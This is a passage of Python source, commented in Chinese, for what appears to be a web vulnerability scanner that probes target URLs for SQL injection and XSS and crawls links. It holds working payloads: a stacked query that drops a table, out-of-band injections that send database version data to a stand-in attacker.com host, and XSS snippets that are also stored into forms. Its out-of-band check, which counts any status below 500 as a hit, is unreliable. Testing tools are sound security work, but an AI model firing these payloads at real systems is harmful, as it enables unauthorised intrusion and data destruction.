        if not isinstance(text1, str):
            if text1 is None:
                text1 = ''
            else:
                text1 = str(text1)

        if not isinstance(text2, str):
            if text2 is None:
                text2 = ''
            else:
                text2 = str(text2)

        if not text1 or not text2:
            return 0

        # 使用基于字符的简单相似度计算
        set1 = set(text1[:1000])  # 只比较前1000个字符
        set2 = set(text2[:1000])

        if not set1 or not set2:
            return 0

        intersection = len(set1.intersection(set2))
        union = len(set1.union(set2))

        return intersection / union if union > 0 else 0

    def _extract_database_info(self, response_text):
        """从响应中提取可能的数据库信息"""
        patterns = {
            'mysql': r"[\d\.]+-MySQL",
            'postgresql': r"PostgreSQL [\d\.]+",
            'mssql': r"Microsoft SQL Server [\d\.]+",
            'oracle': r"Oracle Database [\d\.]+",
            'sqlite': r"SQLite [\d\.]+"
        }
        
        for db_type, pattern in patterns.items():
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return {
                    'type': db_type,
                    'version': match.group(0)
                }
        
        return None

    # ==================== 堆叠查询检测 ====================
    def detect_stacked_queries(self, url, param_name, param_value, method, post_data):
        """堆叠查询检测（支持多语句执行）"""
        stacked_payloads = self.sql_payloads.get("stacked", [])
        
        if not stacked_payloads:
            # 如果没有配置的堆叠payload，使用默认的
            stacked_payloads = [
                {"payload": "'; SELECT 'stacked'--", "database": "generic"},
                {"payload": "'; WAITFOR DELAY '00:00:02'--", "database": "mssql"},
                {"payload": "'; DROP TABLE IF EXISTS test_table--", "database": "generic"}
            ]
        
        for payload_info in stacked_payloads[:5]:  # 只测试前5个
            payload = payload_info.get("payload", "")
            db_type = payload_info.get("database", "generic")
            
            try:
                test_value = f"{param_value}{payload}"
                request_info = {
                    'method': method.upper(),
                    'url': url,
                    'headers': self.sql_config.get("request_config", {}).get("headers", {}),
                    'allow_redirects': True
                }
                
                if method.upper() == "GET":
                    test_url = self._build_url_with_param(url, param_name, test_value)
                    request_info['url'] = test_url
                else:
                    data = post_data.copy() if post_data else {}
                    data[param_name] = test_value
                    request_info['data'] = data
                
                response = self.send_controlled_request(request_info)
                
                if response and 'response' in response:
                    # 检查响应中是否有堆叠查询的特征
                    if self._check_stacked_indicator(response['response']['content']):
                        # 验证：发送不包含堆叠的payload
                        safe_value = f"{param_value}' AND '1'='1"
                        safe_response = self._send_request(url, param_name, safe_value, method, post_data)
                        
                        if safe_response and response['response']['content'] != safe_response['response']['content']:
                            return {
                                'type': 'Stacked Queries SQL Injection',
                                'payload': payload,
                                'database': db_type,
                                #'confidence': 'Medium',
                                'confidence': '中',
                                'evidence': 'Stacked query indicator found',
                                'technique': 'Multiple statement execution'
                            }
                            
            except Exception:
                continue
        
        return None

    def _check_stacked_indicator(self, response_text):
        """检查堆叠查询的指示器"""
        indicators = [
            "stacked",
            "multiple statements",
            "batch execution",
            "xp_cmdshell",
            "command executed"
        ]
        
        for indicator in indicators:
            if indicator.lower() in response_text.lower():
                return True
        
        return False


    def check_sql_injection(self, url, param_name=None, param_value=None, method="GET", post_data=None):
        """
        全面的SQL注入检测入口
    
        Returns:
            tuple: (漏洞列表, 扫描结果统计)
        """
        # 确保url是字符串类型
        if isinstance(url, list):
            print(f"⚠️  警告: url参数是列表类型，将使用第一个元素")
            if url:
                url = url[0]
            else:
                print(f"❌ 错误: url列表为空")
                return [], self.results

        if not isinstance(url, str):
            print(f"❌ 错误: url参数必须是字符串，但得到 {type(url)}")
            return [], self.results

        # 确保url是有效的URL格式
        if not url.startswith(('http://', 'https://')):
            print(f"⚠️  警告: URL缺少协议，添加http://")
            url = f"http://{url}"
        
        print_colored(f"\n{'='*60}","yellow")
        print_colored(f"\n🔍 开始全面检测SQL注入: {url}","red")
        print_colored(f"\n{'='*60}","yellow")
        if param_name and param_value:
            print(f"   参数: {param_name} = {param_value}")
        print(f"   方法: {method}")

        vulnerabilities = []

        try:
            # 获取基准响应（用于后续对比）
            baseline = self.get_baseline_response(url, param_name or "id", param_value or "1", method, post_data)

            # 1. 基于错误的检测
            print("\n[1/6] 基于错误的注入检测...")
            error_result = self.detect_error_based(url, param_name or "id", param_value or "1", method, post_data, baseline)
            if error_result:
                vulnerabilities.append(self._format_vulnerability(error_result, url, param_name, method))

            # 2. 布尔盲注检测
            print("[2/6] 布尔盲注检测...")
            boolean_result = self.detect_boolean_based(url, param_name or "id", param_value or "1", method, post_data, baseline)
            if boolean_result:
                vulnerabilities.append(self._format_vulnerability(boolean_result, url, param_name, method))

            # 3. 时间盲注检测
            print("[3/6] 时间盲注检测...")
            time_result = self.detect_time_based(url, param_name or "id", param_value or "1", method, post_data)
            if time_result:
                vulnerabilities.append(self._format_vulnerability(time_result, url, param_name, method))

            # 4. 联合查询检测
            print("[4/6] 联合查询注入检测...")
            union_result = self.detect_union_based(url, param_name or "id", param_value or "1", method, post_data, baseline)
            if union_result:
                vulnerabilities.append(self._format_vulnerability(union_result, url, param_name, method))

            # 5. 堆叠查询检测
            print("[5/6] 堆叠查询检测...")
            stacked_result = self.detect_stacked_queries(url, param_name or "id", param_value or "1", method, post_data)
            if stacked_result:
                vulnerabilities.append(self._format_vulnerability(stacked_result, url, param_name, method))

            # 6. 带外数据检测（DNS/HTTP）
            print("[6/6] 带外数据检测...")
            oob_result = self.detect_out_of_band(url, param_name or "id", param_value or "1", method, post_data)
            if oob_result:
                vulnerabilities.append(self._format_vulnerability(oob_result, url, param_name, method))

            # 更新统计信息
            self.update_sql_statistics(vulnerabilities)

            print(f"\n{'='*60}")
            print(f"扫描完成！")
            print(f"发现漏洞: {len(vulnerabilities)}")

            # 输出漏洞信息
            if vulnerabilities:
                print(f"\n漏洞详情:")
                for i, vuln in enumerate(vulnerabilities, 1):
                    print(f"{i}. URL: {vuln['url']}")
                    print(f"   类型: {vuln['type']}")
                    print(f"   参数: {vuln.get('parameter', param_name or 'N/A')}")
                    print(f"   方法: {vuln['method']}")
                    print(f"   可信度: {vuln['confidence']}")
                    if 'error_indicator' in vuln:
                        print(f"   错误指示: {vuln['error_indicator']}")
                    #print()

            # 更新全局结果
            self.results['vulnerabilities'].extend(vulnerabilities)

            return vulnerabilities, self.results

        except Exception as e:
            print(f"❌ SQL注入检测过程中发生错误: {e}")
            import traceback
            traceback.print_exc()
            return [], self.results

    def _format_vulnerability(self, detection_result, url, param_name, method):
        """
        格式化检测结果为统一漏洞格式
        """
        # 提取检测结果中的关键信息
        vuln_type_map = {
            'error_based': 'Error-based SQL Injection',
            'boolean_based': 'Boolean-based Blind SQL Injection',
            'time_based': 'Time-based Blind SQL Injection',
            'union_based': 'Union-based SQL Injection',
            'stacked_queries': 'Stacked Queries SQL Injection',
            'out_of_band': 'Out-of-band SQL Injection'
        }

        # 如果检测结果已经是字典格式，直接使用或转换
        if isinstance(detection_result, dict):
            # 确保有必要的字段
            vuln = detection_result.copy()
            vuln['url'] = url

            # 设置或确保参数名
            if 'parameter' not in vuln and param_name:
                vuln['parameter'] = param_name

            # 设置或确保方法
            if 'method' not in vuln:
                vuln['method'] = method

            # 确保有类型字段
            if 'type' not in vuln and 'detection_type' in vuln:
                detection_type = vuln.get('detection_type', '').lower()
                vuln['type'] = vuln_type_map.get(detection_type, f"SQL Injection ({detection_type})")
            elif 'type' not in vuln:
                vuln['type'] = 'SQL Injection'

            # 确保有可信度字段
            if 'confidence' not in vuln and 'certainty' in vuln:
                vuln['confidence'] = vuln['certainty']
            elif 'confidence' not in vuln:
                #vuln['confidence'] = 'Medium'
                vuln['confidence'] = '中'

            return vuln
        else:
            # 如果不是字典格式，创建标准格式
            return {
                'url': url,
                'type': 'SQL Injection',
                'parameter': param_name or 'unknown',
                'method': method,
                #'confidence': 'Medium',
                'confidence': '中',
                'description': str(detection_result)
            }

    def detect_out_of_band(self, url, param_name, param_value, method, post_data):
        """带外数据检测（DNS/HTTP）"""
        oob_payloads = self.sql_payloads.get("oob", [])
        
        if not oob_payloads:
            # 如果没有配置的OOB payload，使用默认的
            oob_payloads = [
                {"payload": "' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT @@version),'.attacker.com\\\\test'))--", "database": "mysql"},
                {"payload": "'; EXEC master..xp_dirtree '\\\\\\\\'+(SELECT @@version)+'.attacker.com\\\\test'--", "database": "mssql"},
                {"payload": "'||UTL_HTTP.REQUEST('http://'||(SELECT banner FROM v$version WHERE rownum=1)||'.attacker.com/test')--", "database": "oracle"}
            ]
        
        for payload_info in oob_payloads[:3]:  # 只测试前3个
            payload = payload_info.get("payload", "")
            db_type = payload_info.get("database", "generic")
            
            try:
                test_value = f"{param_value}{payload}"
                request_info = {
                    'method': method.upper(),
                    'url': url,
                    'headers': self.sql_config.get("request_config", {}).get("headers", {}),
                    'allow_redirects': True
                }
                
                if method.upper() == "GET":
                    test_url = self._build_url_with_param(url, param_name, test_value)
                    request_info['url'] = test_url
                else:
                    data = post_data.copy() if post_data else {}
                    data[param_name] = test_value
                    request_info['data'] = data
                
                response = self.send_controlled_request(request_info)
                
                if response and 'response' in response:
                    # 在实际环境中，这里需要检查DNS/HTTP日志
                    # 这里简化处理：如果请求成功且没有错误，则认为是可能的带外漏洞
                    if response['response']['status_code'] < 500:
                        # 可以结合其他特征进一步判断
                        return {
                            'type': 'Out-of-Band SQL Injection',
                            'payload': payload,
                            'database': db_type,
                            #'confidence': 'Low-Medium',
                            'confidence': '中',
                            'evidence': 'OOB payload executed without error',
                            'technique': 'DNS/HTTP exfiltration'
                        }
                        
            except Exception:
                continue
        
        return None

    def evaluate_sql_results(self, detection_results, baseline):
        """综合评估SQL注入检测结果"""
        if not detection_results:
            return {
                'vulnerable': False,
                'confidence': 'None',
                'summary': 'No SQL injection vulnerabilities detected'
            }
        
        # 按可信度排序
        confidence_map = {'High': 3, 'Medium-High': 2.5, 'Medium': 2, 'Low-Medium': 1.5, 'Low': 1}
        
        # 计算平均可信度
        total_weight = 0
        total_confidence = 0
        
        for result in detection_results:
            weight = confidence_map.get(result.get('confidence', 'Low'), 1)
            total_weight += weight
            total_confidence += weight * confidence_map.get(result['confidence'], 1)
        
        avg_confidence = total_confidence / total_weight if total_weight > 0 else 0
        
        # 确定最终结论
        if avg_confidence >= 2.5:  # High or Medium-High
            verdict = 'Definitely Vulnerable'
            confidence = 'High'
        elif avg_confidence >= 1.5:  # Medium
            verdict = 'Likely Vulnerable'
            #confidence = 'Medium'
            confidence = '中'
        else:
            verdict = 'Potentially Vulnerable'
            confidence = 'Low'
        
        # 收集发现的漏洞类型
        vuln_types = set(r['type'] for r in detection_results)
        
        return {
            'vulnerable': True,
            'confidence': confidence,
            'verdict': verdict,
            'detected_types': list(vuln_types),
            'total_findings': len(detection_results),
            'details': detection_results
        }

    def update_sql_statistics(self, vulnerabilities):
        """更新SQL注入统计信息"""
        stats = self.results['sql_statistics']
        
        if not vulnerabilities:
            return
        
        # 获取唯一的URL列表
        unique_urls = set()
        for vuln in vulnerabilities:
            if 'url' in vuln:
                unique_urls.add(vuln['url'])
            elif 'tested_url' in vuln:
                unique_urls.add(vuln['tested_url'])
        
        stats["total_tested"] = len(unique_urls)
        stats["vulnerable_urls"] = len(unique_urls)
        
        # 按类型统计
        for vuln in vulnerabilities:
            vuln_type = vuln["type"].split("(")[-1].split(")")[0] if "(" in vuln["type"] else vuln["type"]
            stats["by_type"][vuln_type] = stats["by_type"].get(vuln_type, 0) + 1
            
            # 按数据库类型统计
            db_type = vuln.get("database", "unknown")
            if not db_type or db_type == "unknown":
                db_type = vuln.get("database_type", "unknown")
            stats["by_database"][db_type] = stats["by_database"].get(db_type, 0) + 1
            
            # 按请求方法统计
            method = vuln.get("method", "unknown")
            stats["by_method"][method] = stats["by_method"].get(method, 0) + 1

    # ==================== XSS检测功能 ====================
    def _extract_parameters(self, url):
        """从URL中提取参数"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # 转换为单个值的字典（而不是列表）
        single_params = {}
        for key, value in params.items():
            if value:
                single_params[key] = value[0]
        
        return single_params

    def _detect_xss_in_response(self, response_text, payload, original_value=None):
        """检测响应中是否存在XSS漏洞"""
        response_lower = response_text.lower()
        payload_lower = payload.lower()
        
        # 1. 检查payload是否在响应中反射
        if payload_lower in response_lower:
            # 检查是否被HTML编码
            encoded_payload = payload.replace('<', '&lt;').replace('>', '&gt;')
            if encoded_payload.lower() not in response_lower:
                # payload存在且没有被HTML编码，可能是漏洞
                
                # 检查payload是否出现在危险上下文中
                for indicator in self.xss_indicators:
                    if indicator in payload_lower and indicator in response_lower:
                        return True, "高", f"发现XSS payload在响应中反射且未编码，出现在危险上下文: {indicator}"
                
                # 检查payload是否出现在script标签中
                if '<script' in payload_lower and '<script' in response_lower:
                    script_start = response_lower.find('<script')
                    script_end = response_lower.find('</script>', script_start)
                    if script_start != -1 and script_end != -1:
                        script_content = response_text[script_start:script_end]
                        if payload in script_content:
                            return True, "高", "payload出现在<script>标签中"
                
                # 检查payload是否出现在事件处理器中
                events = ['onload=', 'onclick=', 'onmouseover=', 'onerror=']
                for event in events:
                    if event in payload_lower:
                        event_start = response_lower.find(event)
                        if event_start != -1:
                            # 检查事件处理器是否被正确转义
                            context = response_text[max(0, event_start-50):min(len(response_text), event_start+100)]
                            if payload in context:
                                return True, "中", f"payload出现在事件处理器中: {event}"
                
                return True, "低", "payload在响应中反射但未编码"
        
        # 2. 检查payload是否被部分反射
        payload_parts = payload.split()
        if len(payload_parts) > 1:
            reflected_parts = [part for part in payload_parts if part.lower() in response_lower]
            if len(reflected_parts) >= len(payload_parts) * 0.5:  # 超过一半的部分被反射
                return True, "中", f"payload部分被反射: {reflected_parts}"
        
        return False, "无", "未发现XSS漏洞"

    def check_xss(self, url_input, method='GET', data=None, cookies=None, headers=None):
        """完整的XSS扫描功能
        
        Args:
            url_input: 单个URL字符串或URL列表
            method: 请求方法 (GET, POST)
            data: POST数据 (字典格式)
            cookies: cookie字典
            headers: 请求头字典
            
        Returns:
            tuple: (漏洞列表, 扫描结果)
        """
        vulnerabilities = []
        
        # 统一处理输入：将单个URL转换为列表
        if isinstance(url_input, str):
            urls = [url_input]
        elif isinstance(url_input, list):
            urls = url_input
        else:
            raise TypeError(f"url_input必须是字符串或列表，但得到{type(url_input)}")
        
        for url in urls:
            if not isinstance(url, str):
                print(f"跳过非字符串URL: {url}")
                continue

            print_colored(f"\n{'='*60}","yellow")
            print_colored(f"\n🔍 开始XSS扫描URL: {url}","red")
            print_colored(f"\n{'='*60}","yellow")
            # 提取URL中的参数
            url_params = self._extract_parameters(url)
            
            # 准备要测试的参数
            test_params = {}
            
            # 如果提供了POST数据，则测试POST参数
            if method.upper() == 'POST' and data:
                test_params = data.copy()
            # 否则测试URL参数
            elif url_params:
                test_params = url_params.copy()
            # 如果没有参数，使用默认测试参数
            else:
                test_params = {'test': 'default'}
            
            if not test_params:
                print(f"[-] URL {url} 没有可测试的参数")
                continue
            
            print(f"[*] 发现 {len(test_params)} 个参数: {list(test_params.keys())}")
            
            # 测试每个参数
            for param_name, original_value in test_params.items():
                print(f"\n[*] 测试参数: {param_name}")
                
                for payload_idx, payload in enumerate(self.xss_payloads):
                    try:
                        # 构建请求
                        if method.upper() == 'POST':
                            # 对于POST请求，将payload注入到data中
                            test_data = data.copy() if data else {}
                            test_data[param_name] = payload
                            
                            request_info = {
                                'method': 'POST',
                                'url': url.split('?')[0],  # 移除查询参数
                                'headers': headers or {},
                                'data': test_data,
                                'cookies': cookies or {}
                            }
                        else:
                            # 对于GET请求，将payload注入到URL参数中
                            if url_params:
                                # 替换特定参数
                                test_params_copy = url_params.copy()
                                test_params_copy[param_name] = payload
                                
                                # 重建URL
                                parsed = urlparse(url)
                                query_string = '&'.join([f"{k}={v}" for k, v in test_params_copy.items()])
                                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"
                            else:
                                # 没有原始参数，添加新参数
                                test_url = f"{url}?{param_name}={payload}"
                            
                            request_info = {
                                'method': 'GET',
                                'url': test_url,
                                'headers': headers or {},
                                'cookies': cookies or {}
                            }
                        
                        print(f"  [>] 测试payload #{payload_idx+1}: {payload[:50]}...")
                        
                        # 发送请求
                        response = self.send_controlled_request(request_info)
                        
                        if response is None:
                            print(f"  [-] 请求失败: {url}")
                            continue
                        
                        # 检查响应
                        response_text = response.get('response', {}).get('text', '')
                        
                        # 检测XSS漏洞
                        is_vulnerable, confidence, details = self._detect_xss_in_response(
                            response_text, payload, original_value
                        )
                        
                        if is_vulnerable:
                            vuln_info = {
                                "url": url,
                                "type": "反射型XSS",
                                "parameter": param_name,
                                "payload": payload,
                                "confidence": confidence,
                                "method": method,
                                "details": details,
                                "response_code": response.get('response', {}).get('status_code'),
                                "tested_url": request_info.get('url') if method.upper() == 'GET' else url
                            }
                            
                            # 如果是POST请求，添加注入的数据
                            if method.upper() == 'POST':
                                vuln_info["injected_data"] = request_info.get('data')
                            
                            vulnerabilities.append(vuln_info)
                            
                            print(f"  [!] 发现XSS漏洞！置信度: {confidence}")
                            print(f"      详情: {details}")
                            
                            # 高置信度的漏洞不再测试更多payload
                            if confidence == "高":
                                break
                    
                    except Exception as e:
                        print(f"  [-] 测试参数 {param_name} 时出错: {e}")
                        continue
            
            # 测试存储型XSS（基础检测）
            if method.upper() == 'POST' and data:
                print(f"\n[*] 开始存储型XSS检测...")
                for payload in self.xss_payloads[:5]:  # 只测试前5个payload
                    try:
                        # 注入payload
                        test_data = data.copy()
                        for key in test_data.keys():
                            if isinstance(test_data[key], str):
                                test_data[key] = payload
                        
                        # 发送POST请求（提交数据）
                        request_info = {
                            'method': 'POST',
                            'url': url,
                            'headers': headers or {},
                            'data': test_data,
                            'cookies': cookies or {}
                        }
                        
                        response = self.send_controlled_request(request_info)
                        
                        if response and response.get('response', {}).get('status_code') in [200, 302]:
                            print(f"  [>] 已提交存储型XSS payload: {payload[:30]}...")
                            
                            # 稍等片刻后重新访问页面查看是否存储
                            time.sleep(1)
                            
                            # 重新访问页面
                            get_request_info = {
                                'method': 'GET',
                                'url': url,
                                'headers': headers or {},
                                'cookies': cookies or {}
                            }
                            
                            get_response = self.send_controlled_request(get_request_info)
                            
                            if get_response:
                                response_text = get_response.get('response', {}).get('text', '')
                                if payload.lower() in response_text.lower():
                                    vulnerabilities.append({
                                        "url": url,
                                        "type": "存储型XSS",
                                        "payload": payload,
                                        "confidence": "中",
                                        "details": "payload在后续访问中仍然存在",
                                        "method": "POST->GET"
                                    })
                                    print(f"  [!] 可能发现存储型XSS漏洞！")
                    
                    except Exception as e:
                        print(f"  [-] 存储型XSS测试出错: {e}")
        
        # 统计结果
        # print(f"\n{'='*60}")
        # print(f"扫描完成！共发现 {len(vulnerabilities)} 个XSS漏洞")
        
        # 按置信度排序
        vulnerabilities.sort(key=lambda x: {"高": 0, "中": 1, "低": 2}[x.get("confidence", "低")])
        
        # # 输出详细结果
        # for i, vuln in enumerate(vulnerabilities, 1):
        #     print(f"\n漏洞 #{i}:")
        #     print(f"  类型: {vuln['type']}")
        #             # 统计结果
        # print(f"\n{'='*60}")
        # print(f"扫描完成！共发现 {len(vulnerabilities)} 个XSS漏洞")
        
        # 按置信度排序
        vulnerabilities.sort(key=lambda x: {"高": 0, "中": 1, "低": 2}[x.get("confidence", "低")])
        
        # 输出详细结果（更具可读性，包含载荷与地址列表）
        for i, vuln in enumerate(vulnerabilities, 1):
            # 构建地址列表，优先使用tested_url，再fallback到url
            addresses = []
            if vuln.get('tested_url'):
                if isinstance(vuln['tested_url'], (list, tuple)):
                    addresses = list(vuln['tested_url'])
                else:
                    addresses = [vuln['tested_url']]
            elif vuln.get('url'):
                if isinstance(vuln['url'], (list, tuple)):
                    addresses = list(vuln['url'])
                else:
                    addresses = [vuln['url']]

            vuln_type = vuln.get('type', 'XSS')
            payload = vuln.get('payload') or vuln.get('injected_data') or vuln.get('details') or 'N/A'

            # 打印为简洁的编号列表，示例格式：
            # 1. Command Injection (Echo-Based)
            #    载荷: & echo COMMAND_TEST
            #    地址: ['http://127.0.0.1/']
            print(f"{i}. {vuln_type}")
            # 对载荷做友好展示：如果是字典（POST注入），则尝试打印关键字段
            if isinstance(payload, dict):
                try:
                    # 取第一个键值对作为示例载荷展示
                    k, v = next(iter(payload.items()))
                    print(f"   载荷: {k}={v}")
                except Exception:
                    print(f"   载荷: {payload}")
            else:
                print(f"   载荷: {payload}")

            print(f"   地址: {addresses}")
        
        # print(f"\n{'='*60}")
        # print(f"扫描完成！共发现 {len(vulnerabilities)} 个XSS漏洞")
        
        # 更新扫描结果
        self.results['vulnerabilities'].extend(vulnerabilities)
        
        return vulnerabilities, self.results

    def check_dom_xss(self, url_input):
        """DOM型XSS检测（需要JavaScript执行环境，这里为基础检测）"""
        print("\n[*] 开始DOM型XSS检测...")
        
        vulnerabilities = []
        
        # DOM XSS相关payload
        dom_payloads = [
            "#<script>alert('DOM XSS')</script>",
            "#javascript:alert('DOM XSS')",
            "?param=123#<img src=x onerror=alert(1)>",
            "?returnUrl=javascript:alert('XSS')",
            "?callback=alert('XSS')"
        ]
        
        if isinstance(url_input, str):
            urls = [url_input]
        elif isinstance(url_input, list):
            urls = url_input
        else:
            raise TypeError(f"url_input必须是字符串或列表，但得到{type(url_input)}")
        
        for url in urls:
            for payload in dom_payloads:
                try:
                    # 构建测试URL
                    if payload.startswith('#'):
                        test_url = f"{url}{payload}"
                    elif payload.startswith('?'):
                        test_url = f"{url}{payload}"
                    else:
                        test_url = f"{url}?{payload}"
                    
                    request_info = {
                        'method': 'GET',
                        'url': test_url,
                        'headers': {}
                    }
                    
                    response = self.send_controlled_request(request_info)
                    
                    if response:
                        # 检查响应中是否有JavaScript处理痕迹
                        response_text = response.get('response', {}).get('text', '')
                        
                        # 查找可能的DOM操作
                        dom_indicators = [
                            'document.write',
                            'innerHTML',
                            'eval(',
                            'setTimeout',
                            'location.hash',
                            'window.location'
                        ]
                        
                        for indicator in dom_indicators:
                            if indicator in response_text:
                                vulnerabilities.append({
                                    "url": url,
                                    "type": "可能的DOM型XSS",
                                    "payload": payload,
                                    "confidence": "低",
                                    "details": f"发现DOM操作函数: {indicator}",
                                    "tested_url": test_url
                                })
                                print(f"  [!] 发现可能的DOM XSS漏洞，使用了 {indicator}")
                                break
                
                except Exception as e:
                    print(f"  [-] DOM XSS测试出错: {e}")
        
        # 更新扫描结果
        self.results['vulnerabilities'].extend(vulnerabilities)
        
        return vulnerabilities, self.results

    # ==================== 爬虫功能 ====================
    def crawl_links(self, url_input):
        """爬取页面中的链接"""
        # 统一处理输入：将单个URL转换为列表
        if isinstance(url_input, str):
            urls = [url_input]
        elif isinstance(url_input, list):
            urls = url_input
        else:
            raise TypeError(f"url_input 必须是字符串或列表，但得到 {type(url_input)}")

        all_links = []
        
        for url in urls:
            # 确保URL是字符串
            if not isinstance(url, str):
                print(f"跳过非字符串URL: {url}")
                continue
            
            print(f"\n开始爬取URL: {url}")
            try:
                request_info = {
                    'method': 'GET',
                    'url': url,
                    'headers': {}
                }
                
                response = self.send_controlled_request(request_info)
                
                # 检查响应是否为None（请求失败）
                if response is None:
                    print(f"请求失败，响应为None: {url}")
                    continue
                
                # 检查解析的内容是否存在
                if 'parsed' not in response:
                    print(f"响应中没有parsed字段: {url}")
                    continue
                    
                body = response['parsed'].get('parsed_content', '') if isinstance(response['parsed'], dict) else str(response['parsed'])
                
                soup = BeautifulSoup(str(body), "html.parser")
                
                # 解析基础URL的域名
                base_domain = urlparse(url).netloc
                links = []
                
                try:
                    if soup:
                        for link in soup.find_all("a", href=True):
                            href = link['href']
                            # 解析链接的域名
                            absolute_url = urljoin(url, href)
                            link_domain = urlparse(absolute_url).netloc                
                            # 只爬取同域名链接（忽略协议差异）
                            if link_domain == base_domain:
                                links.append(absolute_url)
                        all_links.extend(links)
                        print(f"从 {url} 爬取到 {len(links)} 个链接")
                except Exception as e:
                    print(f"解析页面失败: {url}, 错误: {e}")
            except Exception as e:
                print(f"爬取链接失败: {url}, 错误: {e}")
        
        # 去重
        unique_links = list(set(all_links))
        print(f"\n总共爬取到 {len(unique_links)} 个唯一链接")
        
        return unique_links

